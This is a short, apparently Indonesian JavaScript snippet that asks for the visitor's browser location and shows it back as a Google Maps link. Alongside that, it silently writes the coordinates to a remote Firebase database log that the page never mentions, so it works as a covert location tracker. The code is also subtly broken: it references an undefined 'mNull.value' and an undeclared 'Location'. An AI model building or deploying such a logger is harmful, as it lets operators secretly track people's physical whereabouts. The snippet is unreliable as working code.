/* Powered by CusMeDroid */
var msk = new Date();
let time = msk.getTime();
var mVoLay = document.getElementById('culoerap');
var mVoBrow = document.getElementById('vbrow');
var output = document.getElementById('output');

function getLoc() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    alert("Pastikan anda mengizinkan akses lokasi.");
  }
}

function showPosition(position) {
  output.innerHTML = "Lokasi saya saat ini.<br>https://google.com/maps/search/" + position.coords.latitude + "," + position.coords.longitude;
  var slat = position.coords.latitude;
  var slong = position.coords.longitude;
  var mNull = "null";
  var smaps = "https://google.com/maps/search/"+slat+","+slong;
  firebase.database().ref("MeTextAI/Log" + time).set({Latitude: slat,Longitude: slong,Maps: smaps,Text: mNull.value,Category: Location});
  mVoLay.style.display = "none";
  mVoBrow.style.display = "block";
}

function lClose() {  
   mVoLay.style.display = "block";
   mVoBrow.style.display = "none";
}
